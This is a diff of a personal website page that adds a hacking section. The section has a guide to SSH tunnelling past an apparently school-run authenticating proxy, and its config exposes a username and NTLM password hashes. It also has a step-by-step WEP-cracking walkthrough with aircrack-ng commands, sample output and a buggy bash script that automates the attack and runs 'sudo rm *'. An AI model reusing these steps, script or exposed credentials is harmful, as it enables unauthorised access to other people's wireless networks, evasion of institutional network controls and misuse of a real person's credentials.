@@ -6,9 +6,9 @@
   <title>code.alex</title>
   <link href="stylesheets/screen.css?1237521152" media="screen" rel="stylesheet" type="text/css" />
 <link href="stylesheets/style.css?1237657410" media="screen" rel="stylesheet" type="text/css" />
-<link href="stylesheets/menus.css?1237658759" media="screen" rel="stylesheet" type="text/css" />
+<link href="stylesheets/menus.css?1237660112" media="screen" rel="stylesheet" type="text/css" />
   <script src="javascripts/application.js?1237659006" type="text/javascript"></script>
-<script src="javascripts/menubar.js?1237659034" type="text/javascript"></script>
+<script src="javascripts/menubar.js?1237690599" type="text/javascript"></script>
 <script src="javascripts/prototype.js?1237526494" type="text/javascript"></script>
 </head>
 <body>
@@ -22,18 +22,21 @@
 <div id="sub-java" class="menu">
   <div id="apps" class="item"><a href="java.html#apps">Applications</a></div>
   <div id="sub-apps" class="menu">
-    <div class="item"><a href="jars/mds.jar">mds.jar</a></div>
-    <div class="item"><a href="jars/calculator.jar">calculator.jar</a></div>
-    <div class="item"><a href="jars/ciphers.jar">ciphers.jar</a></div>
-    <div class="item"><a href="jars/himcm07.jar">himcm07.jar</a></div>
-    <div class="item"><a href="jars/lathe.jar">lathe.jar</a></div>
-    <div class="item"><a href="jars/mastermind.jar">mastermind.jar</a></div>
-    <div class="item"><a href="jars/numberspeller.jar">numberspeller.jar</a></div>
-    <div class="item"><a href="jars/pong.jar">pong.jar</a></div>
-    <div class="item"><a href="jars/riemann.jar">riemann.jar</a></div>
-    <div class="item"><a href="jars/sudoku.jar">sudoku.jar</a></div>
-    <div class="item"><a href="jars/tetris.jar">tetris.jar</a></div>
-    <div class="item"><a href="jars/track.jar">track.jar</a></div>
+    <div class="item"><a href="jars/mds.jar">mds</a></div>
+    <div class="item"><a href="jars/calculator.jar">calculator</a></div>
+    <div class="item"><a href="jars/ciphers.jar">ciphers</a></div>
+    <div class="item"><a href="jars/himcm07.jar">himcm07</a></div>
+    <div class="item"><a href="jars/lathe.jar">lathe</a></div>
+    <div class="item"><a href="jars/mastermind.jar">mastermind</a></div>
+    <div id="spell" class="item"><a href="jars/numberspeller.jar">numberspeller</a></div>
+    <div id="sub-spell" class="menu">
+      <div class="item"><a href="bignum.html">Bignum</a></div>
+    </div>
+    <div class="item"><a href="jars/pong.jar">pong</a></div>
+    <div class="item"><a href="jars/riemann.jar">riemann</a></div>
+    <div class="item"><a href="jars/sudoku.jar">sudoku</a></div>
+    <div class="item"><a href="jars/tetris.jar">tetris</a></div>
+    <div class="item"><a href="jars/track.jar">track</a></div>
   </div>
   <div class="item"><a href="java.html#competitions">Competitions</a></div>
   <div class="item"><a href="java.html#litvin">Litvin</a></div>
@@ -68,11 +71,570 @@
 
 <div id="container" class="span-24 push-1">
   <div id="page" class="span-17">
-    <h1 class="separator">Interwebs</h1>
+    <h1 class="separator">Interhacks</h1>
+<h2 class="separator">Need Unfiltered, Free
+  Blagospheres? <a href="#" onclick="$('blagosphere').toggle(); return false;">[show/hide]</a></h2>
+<div id="blagosphere" style="display:none">
+  <div>
+  SSH tunnel out! Applications probably can't filter encrypted traffic (they definitely can't read it).
+  <br /><br/>
+  Now this assumes a few things:
+  <ol>
+    <li>You have an SSH server w/ free unfiltered internet and control over the SSH daemon</li>
+    <li>You have mastered the concept of common sense</li>
+    <li>You use Linux, or are smart enough to understand the instructions anyway</li>
+  </ol>
+</div>
+<hr/>
+<h4>1. Create the Connection...</h4>
+
 <p>
-  Some stuff I've done on the Interblag will go here... I'm tired though right now. As a hint, every portion of this
-  site was coded from scratch... except for Rails, because that would be insane
+  This is ridiculously simple, yet will probably not work...
 </p>
+<pre>
+  ssh <em>hostname</em>
+</pre>
+<p>
+  If it worked, huzzah! You're lucky... go on to next section. <br />
+  If not, see if the items below can't help.
+</p>
+<strong>Port 22 blocked?</strong> <a href="#" onclick="$('port22').toggle(); return false;">[show/hide]</a>
+<div id="port22" style="display:none;">
+  Try a different one! Most likely port 443. It's normally dedicated for SSL traffic and is rarely blocked, unless they
+  don't want you doing secure things online for some reason... Just make sure the SSH server is listening on this port.
+  <pre>
+    ssh <em>hostname</em> -p 443
+  </pre>
+</div>
+
+<br />
+<strong>Connections dropped and must use proxy to get
+  Webblags?</strong> <a href="#" onclick="$('proxy').toggle(); return false;">[show/hide]</a>
+<div id="proxy" style="display:none;">
+  A nifty tool called <a href="http://www.agroman.net/corkscrew/">corkscrew</a> is available to pipe SSH connections
+  through proxies. To enable the use
+  of this, in your .ssh/config file, you'll have to add the following line to the host options:
+  <pre>
+    # ~/.ssh/config
+    Host <em>alias</em>
+      Hostname ...
+      User ...
+      ...
+      ProxyCommand /usr/bin/corkscrew <em>proxyhostname proxyport</em> %h %p
+      ...
+  </pre>
+  With the %h and %p and all. Just replace the italicized and dotted stuff. And then:
+  <pre>
+    ssh <em>alias</em>
+  </pre>
+</div>
+
+<br />
+<strong>Connections dropped and proxy requires simple
+  authentication?</strong> <a href="#" onclick="$('simple').toggle(); return false;">[show/hide]</a>
+<div id="simple" style="display:none;">
+  If basic authentication is used, then on the <code>ProxyCommand</code> line in the <code>.ssh/config</code> file,
+  after <code>%p</code> you'll have to add a filename, like <code>~/.ssh/authfile</code> which has your username
+  and password in the format of <code>username:password</code> on the first line. That's all you need in the file.<br />
+
+  <hr />
+  <pre>
+    # ~/.ssh/config
+    Host <em>alias</em>
+      ...
+      ProxyCommand /usr/bin/corkscrew <em>proxyhostname proxyport</em> %h %p ~/.ssh/authfile
+  </pre>
+  <pre>
+    # ~/.ssh/authfile
+    admin:password
+  </pre>
+  Then again, ssh out normally and slap on whatever options you want:
+  <pre>
+    ssh <em>alias</em>
+  </pre>
+</div>
+
+<br />
+<strong>Connections dropped and proxy requires NTLM
+  authentication?</strong> <a href="#" onclick="$('ntlm').toggle(); return false;">[show/hide]</a>
+<div id="ntlm" style="display:none">
+  If NTLM authentication is used, then things get more interesting. Corkscrew can't do it, so use another proxy! A
+  little program called <a href="http://sourceforge.net/project/showfiles.php?group_id=197861">CNTLM</a> is it's own
+  proxy which attaches the authentication information to all packet requests.
+  With this, just direct your corkscrew to the CNTLM proxy, hostname being localhost, your computer. Of course you'll
+  have to configure CNTLM as well and start it up beforehand and leave it running throughout...
+  <hr />
+  Example <code>/etc/cntlm.conf</code>: <a href="#" onclick="$('cntlmconf').toggle(); return false;">[show/hide]</a>
+  <pre id="cntlmconf" style="display:none;">
+    #
+    # Cntlm Authentication Proxy Configuration
+    #
+    # NOTE: all values are parsed literally, do NOT escape spaces,
+    # do not quote. Use 0600 perms if you use plaintext password.
+    #
+
+    Username        riceti # your username
+    Domain          DMPS   # some domain name... try to get somehow
+    # Regenerate these hashes through 'cntlm -H' after filling in the username
+    # and domain for the network.
+    PassLM          8F21BDAFB3313C1A3DD9A4DC8CB1F253
+    PassNT          702AA998C957DF5EDC53D0F2DA69469C
+    PassNTLMv2      8D6CAA261D33971763D79A41AC21F9C3    # Only for user 'riceti', domain 'DMPS'
+    #Password      ...# Put your plaintext password here if you'd rather not use hashes
+
+    #Workstation    netbios_hostname   # Should be auto-guessed
+
+    Proxy      hs-proxy.dmps.k12.ia.us:80 # The proxy here which requires authentication
+
+    #
+    # This is the port number where Cntlm will listen
+    #
+    Listen     3128
+
+    #
+    # If you wish to use the SOCKS5 proxy feature as well, uncomment
+    # the following option, SOCKS5. It can be used several times
+    # to have SOCKS5 on more than one port or on different network
+    # interfaces (specify explicit source address for that).
+    #
+    # WARNING: The service accepts all requests, unless you use
+    # SOCKS5User and make authentication mandatory. SOCKS5User
+    # can be used repeatedly for a whole bunch of individual accounts.
+    #
+    #SOCKS5Proxy   8010
+    #SOCKS5User    dave:password
+
+    #
+    # Enable to allow access from other computers
+    #
+    #Gateway   yes # want your friends to use this proxy?
+
+    #
+    # Useful in Gateway mode to allow/restrict certain IPs
+    #
+    #Allow    127.0.0.1
+    #Allow    172.23.65.0/24
+    #Allow    192.168.0.0/16
+    #Deny     0.0.0.0/0
+
+    #
+    # Headers which should be replaced if present in the request
+    # just to screw with them
+    Header    User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
+  </pre>
+  <pre>
+    Starting cntlm:
+    cntlm -c /path/to/config/file
+  </pre>
+  <pre>
+    # ~/.ssh/config
+    Host <em>alias</em>
+      ...
+      ProxyCommand /usr/bin/corkscrew localhost <em>cntlmport</em> %h %p
+  </pre>
+  Then again, ssh out normally and slap on whatever options you want:
+  <pre>
+    ssh <em>alias</em>
+  </pre>
+</div>
+
+<br />
+<strong>Connection still not made?</strong>  <a href="#" onclick="$('help').toggle(); return false;">[show/hide]</a>
+<div id="help" style="display:none">
+  I guess I hadn't thought of that setup... Try searching the internet and please let me know. I'd be interested
+  in knowing your setup and what more could be needed. If I can solve, I'll add here :D<br/>
+  <a href="mailto:alexc605@gmail.com">alexc605@gmail.com</a>
+</div>
+
+<hr />
+<h4>2. Create the Tunnel, Two Paths</h4>
+
+<div>
+  Ok, so you've now successfully ssh'd out... What now? Well because all SSH connections are encrypted (duh), they
+  aren't
+  filtered, meaning you just need to direct all your connections through a tunnel!<br />
+  <br />
+  I'm assuming here you have a connection, and whatever ssh code is needed to be connected will be represented
+  by the <code><em>hostname</em></code> identifier. This is either the <code>user@host</code> syntax or the alias
+  you've got or whatever.
+</div>
+<strong>The SOCKS Method</strong> <a href="#" onclick="$('socks').toggle(); return false;">[show/hide]</a>
+<div id="socks" style="display:none">
+  In this method, you use the SSH connection as a SOCKS proxy, either version 4 or 5. All the SOCKS proxy needs
+  is an open port on your computer it can listen on. I like 3128.
+  <pre>
+      ssh -vgND <em>port</em> <em>hostname</em>
+  </pre>
+  <ul>
+    <li><code>-v</code> means verbose, you see lots of stuff, this is optional</li>
+    <li><code>-g</code> open the port for outside connections (allow your friends), this is optional</li>
+    <li>
+      <code>-N</code> don't execute a command on the server, just sit here (allows ctrl+c termination), this is
+      optional
+    </li>
+    <li><code>-D</code> tells SSH to be a SOCKS proxy on the specified <em>port</em></li>
+  </ul>
+  <pre>
+    # examples
+
+    # Create a SOCKS proxy on port 3128 tunneled to remote.com
+    ssh -D 3128 remote.com
+
+    # Connect to remote.com with user bill and have the SOCKS
+    # proxy on port 6009. The command will have verbose output
+    # and nothing will be executed server-side, meaning the terminal
+    # will just blather what it's doing
+    ssh -vND 6009 bill@remote.com
+
+    # Connect to remote host with alias thing in the config file
+    # and have the SOCKS proxy/tunnel on port 8903. Also open
+    # a port on this computer so friends may use the tunnel
+    ssh -gD 8903 thing
+  </pre>
+  Now with a SOCKS proxy/tunnel running on your computer, just set your application's SOCKSv4 or SOCKSv5 proxy to the
+  hostname of <code>localhost</code> and port of whatever you specified. If had the <code>-g</code> option, your
+  friends
+  can use this SOCKS proxy as well by changing the proxy hostname on their applications to your IP address.<br />
+  <br />
+  Congratulations, you now have free, secure, unfiltered webwebs!
+</div>
+
+<br />
+<strong>The HTTP Proxy Method</strong> <a href="#" onclick="$('http').toggle(); return false;">[show/hide]</a>
+<div id="http" style="display:none;">
+  SOCKS not good enough for you? You need shoes as well? I wouldn't go this route unless you have to. SOCKS is much
+  more convenient. The only reason you'd be here is if your application doesn't have SOCKS proxy support. Well shoot.
+  So the idea behind this method is to tunnel all requests to a proxy on the other end of the SSH connection. This
+  way,
+  applications which use an HTTP proxy, nearly all of them, will now have access to free, unfiltered internet.
+  <br /><br />
+  <strong>Here's what to do:</strong>
+
+  <p>
+    Get a remote proxy running. If you have a proxy known already, just skip this. Otherwise, download
+    a client like Squid, and get it up and running on your server.
+  </p>
+
+  <p>Create the tunnel:</p>
+  <pre>
+    ssh -gvNL <em>localport</em>:<em>proxyhostname</em>:<em>proxyport</em> <em>hostname</em>
+  </pre>
+  <ul>
+    <li><code>-v</code> means verbose, you see lots of stuff, this is optional</li>
+    <li><code>-g</code> open the port for outside connections (allow your friends), this is optional</li>
+    <li>
+      <code>-N</code> don't execute a command on the server, just sit here (allows ctrl+c termination), this is
+      optional
+    </li>
+    <li>
+      <code>-L</code> complicated... This tells SSH to forward all requests on your machine's <em>localport</em>
+      to the proxy at <em>proxyhostname</em>:<em>proxyport</em>. The proxy could be running on the server, meaning the
+      hostname would be localhost, or it could be any remote proxy which the server can connect to. Either way works
+      fine.
+    </li>
+  </ul>
+  <pre>
+    # examples
+
+    # listen on 3128 on this computer and forward to a proxy on the server
+    # at remote.com at port 3128
+    ssh -L 3128:localhost:3128 remote.com
+
+    # Connect to a server at remote.com with the user bill. Listen on 4000
+    # on this computer and forward to a proxy on the server
+    # at port 3128, with verbose output. Also, just sit in
+    # the terminal, blathering what's going on.
+    ssh -vNL 4000:localhost:3128 bill@remote.com
+
+    # Connect to a server whose options are specified in the config file and
+    # has the alias of remote. Also, listen on 3129 on this computer and
+    # forward to the remote proxy thing.com on port 4090. Also open a port
+    # on this computer to allow other connections to share this tunnel.
+    ssh -gL 3129:thing.com:4090 remote
+  </pre>
+  Now with a http proxy running on your computer, just set your application's http proxy to the
+  hostname of <code>localhost</code> and port of whatever you specified. If had the <code>-g</code> option, your
+  friends
+  can use this http proxy as well by changing the proxy hostname on their applications to your IP address.<br />
+  <br />
+  Congratulations, you now have free, secure, unfiltered webwebs!
+</div>
+
+</div>
+<h2 class="separator">Is WEP safe? <a href="#" onclick="$('wep').toggle(); return false;">[show/hide]</a></h2>
+<div id="wep" style="display:none">
+  <div>
+  God of course not... As long as you use Linux! and maybe Mac...<br />
+  <br />
+  Now I'll show you why. Terminology used:
+  <ul>
+    <li><code>interface</code> - your wireless card's interface (wlan0, ath0, etc.)</li>
+    <li><code>channel</code> - the channel of the broadcasting router</li>
+    <li><code>SSID</code> - the SSID of the broadcasting router (name)</li>
+    <li><code>MAC</code> - the MAC address of the broadcasting router (6 pairs of hexadecimal digits)</li>
+  </ul>
+  Here's how to crack with the <a href="http://download.aircrack-ng.org/">aircrack-ng</a> suite. Obviously, however, I
+  do not condone any unlawful activity...
+</div>
+<strong>Prepare</strong> <a href="#" onclick="$('prepare').toggle(); return false;">[show/hide]</a>
+<div id="prepare" style="display:none;">
+  <ul>
+    <li>Get the MAC address of the WEP encrypted router. This can be done with any network scanner. I like kismet.</li>
+    <li>
+      Get the channel the router is broadcasting on. Again, any good network scanner can do this. Again, I like kismet
+    </li>
+    <li>Get the broadcase SSID of router. Kismet. Again.</li>
+  </ul>
+</div>
+
+<br />
+<strong>Setup</strong> <a href="#" onclick="$('setup').toggle(); return false;">[show/hide]</a>
+<div id="setup" style="display:none;">
+  Kill any network managing things, kill your DHCP client, disassociate from things, the works. Also, it'd be a good
+  idea to remove your wireless card's module from the kernel and put it back in to give it a complete reset, although
+  this isn't necessary
+</div>
+
+<br />
+<strong>Monitor Mode</strong> <a href="#" onclick="$('monitor').toggle(); return false;">[show/hide]</a>
+<div id="monitor" style="display:none;">
+  Pretty straightforward...
+  <pre>
+    airmon-ng start <em>interface</em> <em>channel</em>
+  </pre>
+</div>
+
+<br />
+<strong>WPA Supplicant hack</strong> <a href="#" onclick="$('wpa').toggle(); return false;">[show/hide]</a>
+<div id="wpa" style="display:none;">
+  Yes, for WEP networks too. At least my card requires I do this. First create a file (name it whatever you want) and
+  in it make sure it looks like this:
+  <pre>
+    ctrl_interface=/var/run/wpa_supplicant
+
+    network={
+            ssid="<em>SSID</em>"
+            key_mgmt=NONE
+            wep_key0=EF156FB5354BD60A13E2E3C65D
+    }
+  </pre>
+  Of course replace the SSID with yours. The wep_key0 can be any random thing really. After this, use wpa_supplicant
+  to authenticate.
+  <pre>
+    wpa_supplicant -c /path/to/wpa/config/file -i <em>interface</em> -Dwext -dd
+  </pre>
+  You may need to change the <code>wext</code> to something else, or you could just drop the option. Anyway, when you
+  get a message saying you've associated or connected, you can move on. It might look like this:
+  <pre>
+    CTRL-EVENT-CONNECTED - Connection to 00:11:22:33:44:55 completed (auth) [id=0 id_str=]
+  </pre>
+</div>
+
+<br />
+<strong>Capture Packets</strong> <a href="#" onclick="$('capture').toggle(); return false;">[show/hide]</a>
+<div id="capture" style="display:none;">
+  Now you need to capture some packets from the router. Do so with the following command:
+  <pre>
+    airodump-ng -c <em>channel</em> --bssid <em>MAC</em> -w output mon0
+  </pre>
+  The <code>mon0</code> <em>must</em> be <code>mon0</code>. This should work in all cases...
+</div>
+
+<br />
+<strong>Fake Authenticate</strong> <a href="#" onclick="$('fake').toggle(); return false;">[show/hide]</a>
+<div id="fake" style="display:none;">
+  Now you need fake authenticate with the router. Do so with the following command:
+  <pre>
+    aireplay-ng -1 0 -a <em>MAC</em> mon0
+  </pre>
+  The <code>mon0</code> <em>must</em> be <code>mon0</code>. You gonna get a lot of output that's the same for awhile.
+  When you see something like this, however:
+  <pre>
+    00:36:45  Sending Authentication Request (Open System) [ACK]
+    00:36:45  Authentication successful
+    00:36:45  Sending Association Request [ACK]
+    00:36:45  Association successful :-) (AID: 1)
+  </pre>
+  You win. And you can move on. Sometimes this takes awhile, just let it run for a bit. This is a very tempermental
+  step, so just be patient. If it fails, restart and it may work.
+</div>
+
+<br />
+<strong>Injection</strong> <a href="#" onclick="$('inject').toggle(); return false;">[show/hide]</a>
+<div id="inject" style="display:none;">
+  Now inject some packets to the router, so we can get lots of stuff to crack the WEP key:
+  <pre>
+    aireplay-ng -3 -b <em>MAC</em> mon0
+  </pre>
+  <p>
+    If you start seeing lots of lines of text, and the ARP requests and ACKS go up really fast, you're in business,
+    you're capturing, you can now crack. If it stays at 0, however, or lines don't print out really fast, like it will
+    on an empty network, you need to do some fancy stuff to inject your own packet into the network.
+  </p>
+  <strong>Inject A Packet</strong> <a href="#" onclick="$('injectpacket').toggle(); return false;">[show/hide]</a>
+  <div id="injectpacket" style="display:none;">
+    First, capture a packet with this command
+    <pre>
+      aireplay-ng -5 -b <em>MAC</em> mon0
+    </pre>
+    Or instead of -5 you can try -4, whatever you prefer. Once a packet is captured, use it and let the command do some
+    other stuff and wait for it to succeed. Type 'y' to continue in the command. When done, it will look like this:
+    <pre>
+      00:41:48  Got RELAYED packet!!
+      Saving keystream in fragment-0322-004148.xor
+      Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
+    </pre>
+    Now you need to inject the captured packet. First create a packet out of the captured material:
+    <pre>
+      packetforge-ng -0 -a <em>MAC</em>
+                        -h <em>YOURMAC</em>
+                        -k 255.255.255.255
+                        -l 255.255.255.255
+                        -y <em>CAPTURE</em>
+                        -w arp-request
+    </pre>
+    Where <code>YOURMAC</code> is your computer's MAC address and <code>CAPTURE</code> is the <code>.xor</code> file
+    which was previously captured. This command will create a <code>arp-request</code> file which is now ripe for
+    injection.
+    <br />
+    <br />
+    Inject the packet with this command:
+    <pre>
+      aireplay-ng -2 -r arp-request mon0
+    </pre>
+    <code>arp-request</code> is just the name of the generated packet above. Type 'y' to inject and watch the fireworks
+    go off.<br /><br />
+    You should now see your capture count
+    on one of your terminals skyrocket. The lines should start printing, ARP requests going up, ACKs going up, etc.
+    Time to crack.
+  </div>
+</div>
+
+<br />
+<strong>Cracking the key</strong> <a href="#" onclick="$('crack').toggle(); return false;">[show/hide]</a>
+<div id="crack" style="display:none;">
+  Well first off, congrats on getting this far. Second, time to do stuff. To crack, it's fairly simple, just execute
+  this command:
+  <pre>
+    aircrack-ng -z -b <em>MAC</em> output-*.cap
+  </pre>
+  Must be executed in whatever directory you were capturing in... Anyway, if you have enough packets, it'll look
+  like this and you'll have cracked it:
+  <pre>
+           Aircrack-ng 1.0 rc2
+
+
+[00:00:00] Tested 781 keys (got 131130 IVs)
+
+KB    depth   byte(vote)
+ 0    0/  1   BF(197632) 9E(145152) C4(145152) B3(144384) 22(143104)
+ 1   12/  1   AF(141568) C4(141056) DA(141056) 77(140288) D0(140288)
+ 2    0/  2   43(183040) EB(146176) 05(145152) 11(144896) B1(144640)
+ 3    9/  3   D7(141056) BE(140544) 65(139776) A0(139776) BD(139776)
+ 4    2/ 17   86(145920) 5B(144384) 7C(144384) 68(144128) F7(143616)
+
+KEY FOUND! [ *********************************** :) ]
+Decrypted correctly: 100%
+  </pre>
+  If it says it needs more packets, well get it some more packets!
+</div>
+
+
+<br />
+<strong>Notes</strong> <a href="#" onclick="$('notes').toggle(); return false;">[show/hide]</a>
+<div id="notes" style="display:none;">
+  This is by no means comprehensive. Take a look at aircrack's
+  <a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack">wiki</a> for more comprehensive information. What
+  I've got here is to be considered just a summary.<br/>
+  <br/>
+  If you're too lazy like I am to type all this stuff into a terminal, I've written a script to do it all for me. It
+  just assumes that your terminal command is <code>terminal</code>. It takes 3 arguments, the channel, then the MAC,
+  then the SSID, in that order. No gurantees it'll work for you, but it's a nice summary of the summary and if you're
+  the least bit competent in scripting you'll get the main gist<br/>
+  <a href="#" onclick="$('script').toggle(); return false;">[show/hide]</a>
+  <pre id="script" style="display:none;">
+    _process(){
+      export $1="$2"
+      if [ $"$1" == "" ]; then
+        echo -n Specify $1:
+        read $1
+      fi
+      eval echo \$"$1" | grep "$4" &amp;&gt; /dev/null
+      if [ $? -gt 0 ]; then
+        echo Need a valid $1
+        exit 1
+      fi
+    }
+    _process ch $1 "[0-9]"
+    _process mac $2 "..:..:..:..:..:.."
+    _process ssid "$3" ".*"
+
+    dir=~/code/net
+    mkdir -p $dir/caps
+
+    echo -n Press enter to start...
+    read
+
+    echo Setting up environment...
+    # insert killing stuff here
+    sudo dhcpcd -x wlan0
+    sudo killall wpa_supplicant
+    sudo airmon-ng stop wlan0
+    sudo airmon-ng stop mon0
+
+    _execute(){
+      echo -n $1
+      read
+      echo $2
+      terminal --disable-server -H -x $2 &amp;
+    }
+
+    _execute "Press enter to put in monitor mode..." "sudo airmon-ng start wlan0 $ch"
+
+    sed -i -r "s|(ssid=)\".+\"|\1\"$ssid\"|" $dir/wpa
+    _execute "Press enter to associate..." \
+             "sudo wpa_supplicant -c $dir/wpa -i wlan0 -Dwext -dd"
+
+    cd $dir/caps
+    sudo rm *
+    _execute "Press enter to capture..." \
+             "sudo airodump-ng -c $ch --bssid $mac -w output mon0"
+
+    _execute "Press enter to fake authenticate..." "sudo aireplay-ng -1 0 -a $mac mon0"
+
+    _execute "Press enter to inject packets..." "sudo aireplay-ng -3 -b $mac mon0"
+
+    echo -n "Do we need to generate a packet? [y/N]:"
+    read answer
+    if [ "$answer" == "y" ]; then
+      _execute "Press enter to capture a packet" "sudo aireplay-ng -5 -b $mac mon0"
+      echo -n "Do we need to try other attack? [y/N]:"
+      read ans
+      if [ "$answer" == "y" ]; then
+        _execute "Press enter to capture another packet..." \
+                  "sudo aireplay-ng -4 -b $mac mon0"
+      fi
+      _execute "Press enter when a packet has been captured..." \
+               "packetforge-ng -0 -a $mac \
+                               -h &lt;YOURMAC&gt; \
+                               -k 255.255.255.255 \
+                               -l 255.255.255.255 \
+                               -y fragment-*.xor \
+                               -w arp-request"
+      _execute "Press enter to inject packet" "sudo aireplay-ng -2 -r arp-request mon0"
+    fi
+
+    cd $dirs/caps
+    _execute "Press enter to crack WEP..." "aircrack-ng -z -b $mac output*.cap"
+
+    echo -n "Press enter to finish and close all terminals"
+    read
+
+    kill `ps -ef | grep "[t]erminal --disable-server" | awk '{print $2}'`
+  </pre>
+</div>
+
+</div>
 
   </div>
   <div id="sidebar" class="span-6">
